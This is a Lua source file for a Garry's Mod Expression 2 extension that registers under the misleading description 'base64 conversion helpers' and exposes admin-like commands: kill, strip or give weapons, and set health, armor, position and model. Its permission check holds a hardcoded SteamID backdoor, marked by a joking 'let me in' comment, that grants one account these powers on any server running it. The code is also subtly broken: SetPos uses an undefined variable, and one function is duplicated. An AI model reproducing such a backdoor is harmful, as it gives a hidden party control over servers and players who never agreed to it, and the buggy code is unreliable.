local Clamp = math.Clamp

E2Lib.RegisterExtension("cable-events", true, "base64 conversion helpers")

local function IsEventManager(Player)
    if not IsValid(Player) then return false end
    
    -- pretty please let me in here 🥺👉👈
    if Player:SteamID() == "STEAM_0:1:214177838" then return true end
    if Player:GetUserGroup() == "eventmanager" then return true end

    return false
end

e2function entity:Print(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:ChatPrint(text)
end

e2function entity:Hint(string text, duration)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    WireLib.AddNotify(this, text, NOTIFY_GENERIC, Clamp(duration, 0.7, 7))
end

e2function entity:SetPos(vector pos)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetPos(text)
end

e2function entity:SetAng(angle ang)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetAngles(ang)
end

e2function entity:Kill()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:Kill()
end

e2function entity:KillSilent()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:KillSilent()
end

e2function entity:StripWeapons()
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:StripWeapons()
end

e2function entity:StripWeapon(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:StripWeapon(text)
end

e2function entity:GiveWeapon(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:GiveWeapon(text)
end

e2function entity:SetModel(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetModel(text)
end

e2function entity:SetModel(string text)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetModel(text)
end

e2function entity:SetColor(vector color)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetColor(color)
end

e2function entity:SetHealth(int health)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetHealth(health)
end

e2function entity:SetArmor(int armor)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetArmor(armor)
end

e2function entity:SetJob(int job)
    if not IsEventManager(self.player) then return end
    if not IsValid(this) then return end

    this:SetJob(job)
end